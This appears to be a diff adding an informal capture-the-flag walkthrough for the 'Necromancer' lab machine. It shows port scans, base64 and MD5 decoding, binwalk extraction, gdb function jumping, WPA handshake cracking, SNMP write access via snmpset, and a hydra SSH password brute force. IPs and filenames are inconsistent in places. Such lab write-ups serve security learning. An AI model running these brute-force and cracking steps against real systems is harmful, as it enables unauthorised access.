@@ -1,0 +1,438 @@
+$ sudo netdiscover - wlp2s0
+	192.168.1.7
+	
+	
+$ nmap -sV -p- 192.168.1.7 -oA nmap.output -T4 -Pn  
+
+nothing came up
+
+$ nmap -sU -p- 192.168.1.7 -T4 -Pn
+
+PORT     STATE 	SERVICE
+666/udp  open  	doom
+
+
+
+I tried to ping the machine but it was droping all my ping requests
+And I decided to watch my internal network using wireshark, fire up the wireshark and see what is going on.
+
+What I saw was that this machine was brute-forcing 4444 port of all machines in my internal network
+
+to see it clearly I typed wireshark entry
+
+ip.src == 192.168.1.7 && tcp.dstport == 4444   and I saw lots of entries
+
+then I quickly set up a listener on my localhost
+
+$ nc -nlvp 4444
+
+and the machines connected to 4444 port
+
+...V2VsY29tZSENCg0KWW91IGZpbmQgeW91cnNlbGYgc3RhcmluZyB0b3dhcmRzIHRoZSBob3Jpem9uLCB3aXRoIG5vdGhpbmcgYnV0IHNpbGVuY2Ugc3Vycm91bmRpbmcgeW91Lg0KWW9
+1IGxvb2sgZWFzdCwgdGhlbiBzb3V0aCwgdGhlbiB3ZXN0LCBhbGwgeW91IGNhbiBzZWUgaXMgYSBncmVhdCB3YXN0ZWxhbmQgb2Ygbm90aGluZ25lc3MuDQoNClR1cm5pbmcgdG8geW9
+1ciBub3J0aCB5b3Ugbm90aWNlIGEgc21hbGwgZmxpY2tlciBvZiBsaWdodCBpbiB0aGUgZGlzdGFuY2UuDQpZb3Ugd2FsayBub3J0aCB0b3dhcmRzIHRoZSBmbGlja2VyIG9mIGxpZ2
+h0LCBvbmx5IHRvIGJlIHN0b3BwZWQgYnkgc29tZSB0eXBlIG9mIGludmlzaWJsZSBiYXJyaWVyLiAgDQoNClRoZSBhaXIgYXJvdW5kIHlvdSBiZWdpbnMgdG8gZ2V0IHRoaWNrZXIs
+IGFuZCB5b3VyIGhlYXJ0IGJlZ2lucyB0byBiZWF0IGFnYWluc3QgeW91ciBjaGVzdC4gDQpZb3UgdHVybiB0byB5b3VyIGxlZnQuLiB0aGVuIHRvIHlvdXIgcmlnaHQhICBZb3UgYX
+JlIHRyYXBwZWQhDQoNCllvdSBmdW1ibGUgdGhyb3VnaCB5b3VyIHBvY2tldHMuLiBub3RoaW5nISAgDQpZb3UgbG9vayBkb3duIGFuZCBzZWUgeW91IGFyZSBzdGFuZGluZyBpbiBz
+YW5kLiAgDQpEcm9wcGluZyB0byB5b3VyIGtuZWVzIHlvdSBiZWdpbiB0byBkaWcgZnJhbnRpY2FsbHkuDQoNCkFzIHlvdSBkaWcgeW91IG5vdGljZSB0aGUgYmFycmllciBleHRlbm
+RzIHVuZGVyZ3JvdW5kISAgDQpGcmFudGljYWxseSB5b3Uga2VlcCBkaWdnaW5nIGFuZCBkaWdnaW5nIHVudGlsIHlvdXIgbmFpbHMgc3VkZGVubHkgY2F0Y2ggb24gYW4gb2JqZWN0
+Lg0KDQpZb3UgZGlnIGZ1cnRoZXIgYW5kIGRpc2NvdmVyIGEgc21hbGwgd29vZGVuIGJveC4gIA0KZmxhZzF7ZTYwNzhiOWIxYWFjOTE1ZDExYjlmZDU5NzkxMDMwYmZ9IGl
+zIGVuZ3JhdmVkIG9uIHRoZSBsaWQuDQoNCllvdSBvcGVuIHRoZSBib3gsIGFuZCBmaW5kIGEgcGFyY2htZW50IHdpdGggdGhlIGZvbGxvd2luZyB3cml0dGVuIG9uIGl0LiAiQ2hhbnQgdGhlIHN0cmluZyBvZiBmbGFnMSAtIHU2NjYi...
+
+I got this
+
+first thing came up to my mind  was to decode it using 64decode
+when I decoded it I got 
+
+Welcome!
+
+You find yourself staring towards the horizon, with nothing but silence surrounding you.
+You look east, then south, then west, all you can see is a great wasteland of nothingness.
+
+Turning to your north you notice a small flicker of light in the distance.
+You walk north towards the flicker of light, only to be stopped by some type of invisible barrier.  
+
+The air around you begins to get thicker, and your heart begins to beat against your chest. 
+You turn to your left.. then to your right!  You are trapped!
+
+You fumble through your pockets.. nothing!  
+You look down and see you are standing in sand.  
+Dropping to your knees you begin to dig frantically.
+
+As you dig you notice the barrier extends underground!  
+Frantically you keep digging and digging until your nails suddenly catch on an object.
+
+You dig further and discover a small wooden box.  
+flag1{e6078b9b1aac915d11b9fd59791030bf} is engraved on the lid.
+
+You open the box, and find a parchment with the following written on it. "Chant the string of flag1 - u666"
+
+
+
+It is addressing flag1's string which is e6078b9b1aac915d11b9fd59791030bf, and I googled it and saw that it has been cracked before and it 
+was an MD5 hash and it is value is "opensesame"
+
+and then when I was thinkin about what the next would be , I remembered that udp port 666 was open , and this "Chant the string of flag1 - u666" means
+pass the string to udp port 666 I think
+
+
+after some googling to send a string to a udp port I found a tool called "socat"
+
+$ socat - UDP:192.168.1.10:666
+and I typed "opensesame" , and I got a response
+
+
+
+
+A loud crack of thunder sounds as you are knocked to your feet!
+
+Dazed, you start to feel fresh air entering your lungs.
+
+You are free!
+
+In front of you written in the sand are the words:
+
+flag2{c39cd4df8f2e35d20d92c2e44de5f7c6}
+
+As you stand to your feet you notice that you can no longer see the flicker of light in the distance.
+
+You turn frantically looking in all directions until suddenly, a murder of crows appear on the horizon.
+
+As they get closer you can see one of the crows is grasping on to an object. As the sun hits the object, shards of light beam from its surface.
+
+The birds get closer, and closer, and closer.
+
+Staring up at the crows you can see they are in a formation.
+
+Squinting your eyes from the light coming from the object, you can see the formation looks like the numeral 80.
+
+As quickly as the birds appeared, they have left you once again.... alone... tortured by the deafening sound of silence.
+
+666 is closed.
+
+
+
+the hash  c39cd4df8f2e35d20d92c2e44de5f7c6      decryptes to 1033750779
+this 80 is port 80 so wee go to http://192.168.1.7
+
+so there is a site running on this server
+
+
+
+Hours have passed since you first started to follow the crows.
+
+Silence continues to engulf you as you treck towards a mountain range on the horizon.
+
+More times passes and you are now standing in front of a great chasm.
+
+Across the chasm you can see a necromancer standing in the mouth of a cave, staring skyward at the circling crows.
+
+As you step closer to the chasm, a rock dislodges from beneath your feet and falls into the dark depths.
+
+The necromancer looks towards you with hollow eyes which can only be described as death.
+
+He smirks in your direction, and suddenly a bright light momentarily blinds you.
+
+The silence is broken by a blood curdling screech of a thousand birds, followed by the necromancers laughs fading as he decends into the cave!
+
+The crows break their formation, some flying aimlessly in the air; others now motionless upon the ground.
+
+The cave is now protected by a gaseous blue haze, and an organised pile of feathers lay before you.
+
+
+$ dirb http://192.168.1.7/ /home/cihan/Desktop/Me/SecLists/raft/data/wordlists/raft-large-directories.txt  quickly started dirb to see what the site has to offer
+
+nothing 
+I tried lots of things here nothing worked 
+I tried strings filename.jpg to see what it has
+and I tried steghide tool but it didnt give anything either.
+
+
+When I was doing some googling I came across with a tool called "binwalk" to see content of an image
+
+$ binwalk pileoffeaters.jpg
+
+DECIMAL       HEXADECIMAL     DESCRIPTION
+--------------------------------------------------------------------------------
+0             0x0             JPEG image data, EXIF standard
+12            0xC             TIFF image data, little-endian offset of first image directory: 8
+36994         0x9082          Zip archive data, at least v2.0 to extract, compressed size: 121, uncompressed size: 125, name: feathers.txt
+37267         0x9193          End of Zip archive, footer length
+
+
+it says that this image file contains a zip file  inside it
+
+I did some googling to extract that zip file and I found this 
+
+$ unzip pileoffeaters.jpg
+and it gave me a file called feathers.txt
+
+$ cat feathers.txt
+
+ZmxhZzN7OWFkM2Y2MmRiN2I5MWMyOGI2ODEzNzAwMDM5NDYzOWZ9IC0gQ3Jvc3MgdGhlIGNoYXNtIGF0IC9hbWFnaWNicmlkZ2VhcHBlYXJzYXR0aGVjaGFzbQ==
+
+looks like base 64, lets decode it 
+
+flag3{9ad3f62db7b91c28b68137000394639f} - Cross the chasm at /amagicbridgeappearsatthechasm
+
+we got flag 3
+
+
+the hash 9ad3f62db7b91c28b68137000394639f  decryptes to 345465869
+and lets go to the file it says on the browser
+http://necromancer/amagicbridgeappearsatthechasm
+
+
+
+You cautiously make your way across chasm.
+
+You are standing on a snow covered plateau, surrounded by shear cliffs of ice and stone.
+
+The cave before you is protected by some sort of spell cast by the necromancer.
+
+You reach out to touch the gaseous blue haze, and can feel life being drawn from your soul the closer you get.
+
+Hastily you take a few steps back away from the cave entrance.
+
+There must be a magical item that could protect you from the necromancer's spell.
+
+
+
+and another image too,   
+
+lets binwalk this image too 
+$ binwalk magicfile.jpg
+
+this time it looks like a regule file 
+tried other tools but didnt work neither. And then I thought in flag 2 last line 
+The cave is now protected by a gaseous blue haze, and an organised pile of feathers lay before you.
+was givin a clue
+
+maybe this one would do it too
+
+There must be a magical item that could protect you from the necromancer's spell.
+
+
+Then I looked for what item could be the one that protects from necromeancers spell
+
+Then I found this site http://5e.d20srd.org/srd/magicItems/magicItemsAToZ.htm
+
+list of all items, I crawled it wiht cewl tool
+and created a list of all items, after it I brute forced the url.
+
+dirb http://necromancer/amagicbridgeappearsatthechasm/  listofitems
+
+it found http://necromancer/amagicbridgeappearsatthechasm/talisman
+
+it downloaded a file called talisman
+
+$ file talisman
+
+talisman: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV),
+dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32,
+BuildID[sha1]=2b131df906087adf163f8cba1967b3d2766e639d, not stripped
+
+$ chmod +x talisman 
+$ ./talisman
+
+You have found a talisman.
+
+The talisman is cold to the touch, and has no words or symbols on it's surface.
+
+Do you want to wear the talisman? 
+
+
+this is a bufferoverflow attack 
+
+
+open the talisman with gdb
+
+$ gdb talisman
+
+> break main
+dissass main
+see there is a function wearTalisman
+
+I know that there are lots of functions
+
+to get list of functions
+
+info functions
+
+there is a function called chantToBreakSpell
+
+let disass it too,
+
+disass chantToBreakSpell
+
+jump chantToBreakSpell
+r
+
+jump chantToBreakSpell
+
+You fall to your knees.. weak and weary.
+Looking up you can see the spell is still protecting the cave entrance.
+The talisman is now almost too hot to touch!
+Turning it over you see words now etched into the surface:
+flag4{ea50536158db50247e110a6c89fcf3d3}
+Chant these words at u31337
+
+
+and we got fourth flag
+
+blackmagic is md5 decrpyted of the flag
+
+
+lets chant the words to udp 313337
+
+$ nc -uvn necromancer 31337
+
+As you chant the words, a hissing sound echoes from the ice walls.
+
+The blue aura disappears from the cave entrance.
+
+You enter the cave and see that it is dimly lit by torches; shadows dancing against the rock wall as you descend deeper and deeper into the mountain.
+
+You hear high pitched screeches coming from within the cave, and you start to feel a gentle breeze.
+
+The screeches are getting closer, and with it the breeze begins to turn into an ice cold wind.
+
+Suddenly, you are attacked by a swarm of bats!
+
+You aimlessly thrash at the air in front of you!
+
+The bats continue their relentless attack, until…. silence.
+
+Looking around you see no sign of any bats, and no indication of the struggle which had just occurred.
+
+Looking towards one of the torches, you see something on the cave wall.
+
+You walk closer, and notice a pile of mutilated bats lying on the cave floor. Above them, a word etched in blood on the wall.
+
+/thenecromancerwillabsorbyoursoul
+
+flag5{0766c36577af58e15545f099a3b15e60}
+
+
+go to http://necromancer/thenecromancerwillabsorbyoursoul
+
+
+we see 
+
+
+flag6{b1c3ed8f1db4258e4dcb0ce565f6dc03}
+
+You continue to make your way through the cave.
+
+In the distance you can see a familiar flicker of light moving in and out of the shadows.
+
+As you get closer to the light you can hear faint footsteps, followed by the sound of a heavy door opening.
+
+You move closer, and then stop frozen with fear.
+
+It's the necromancer!
+
+
+Again he stares at you with deathly hollow eyes.
+
+He is standing in a doorway; a staff in one hand, and an object in the other.
+
+Smirking, the necromancer holds the staff and the object in the air.
+
+He points his staff in your direction, and the stench of death and decay begins to fill the air.
+
+You stare into his eyes and then.......
+
+
+...... darkness. You open your eyes and find yourself lying on the damp floor of the cave.
+
+The amulet must have saved you from whatever spell the necromancer had cast.
+
+You stand to your feet. Behind you, only darkness.
+
+Before you, a large door with the symbol of a skull engraved into the surface.
+
+Looking closer at the skull, you can see u161 engraved into the forehead.
+
+
+
+
+there is a link to file called necromancer, download it and examine it
+
+$ file necromancermv 
+necromancer: bzip2 compressed data, block size = 900k
+
+$ mv necromancer necromancer.bz2
+
+$ bzip2 -d necromancer.bz2
+   necromancer
+   
+$ file necromancer
+necromancer: POSIX tar archive (GNU)
+
+$ mv necromancer necromaner.tar
+
+$ tar xf necromancer.tar
+
+ necromancer.pcap
+ 
+ 
+
+it is a nwtwork packets file . When I was checking it out I saw that a wifi attack
+has been conducted to a ssıd caclled community. 
+and also there is a 4 way handshake , so we can crack it and get the password.
+
+there is a good article on this https://medium.com/@brannondorsey/crack-wpa-wpa2-wi-fi-routers-with-aircrack-ng-and-hashcat-a5a5d3ffea46
+
+to crack pcap 4 way handshake
+
+It cracked the password and it is 
+
+"death2all"   withouts quotes 
+
+
+above it says u161 which means udp port 161 lets nmap it and see what it is
+
+$ nmap -sUV  necromancer -p 161 -T5 -Pn
+
+
+PORT    	STATE         		SERVICE VERSION
+161/udp 	open|filtered 		snmp
+
+there is a good article here about snmp
+https://linoxide.com/how-tos/snmp-installation-linux-server/
+
+$ snmpwalk -c death2all necromancer -v 1
+
+
+
+Hostname : Fear the Necromancer!
+Description : You stand in front of a door.
+Contact : The door is Locked. If you choose to defeat me, the door must be Unlocked.
+Location : Locked — death2allrw
+
+
+
+
+snmpset -c “death2allrw” -v 1 10.0.2.5 iso.3.6.1.2.1.1.6.0 s “Unlocked”
+
+snmpwalk -c “death2allrw” -v 1 10.0.2.5
+
+STRING: “The door is unlocked! You may now enter the Necromancer’s lair!”
+iso.3.6.1.2.1.1.5.0 = STRING: “Fear the Necromancer!”
+iso.3.6.1.2.1.1.6.0 = STRING: “flag7{9e5494108d10bbd5f9e7ae52239546c4} — t22”
+
+demonslayer is cracked of flag
+
+
+t22 means tcp 22 which is ssh
+
+probably demonslayer is the username now we will use hydra to bruteforce password
+
+$  hydra -s 22 -l demonslayer -P rockyou.txt necromancer ssh
+
+password is 12345678
+
+$ ssh -l demonslayer mecromancer 
+
+
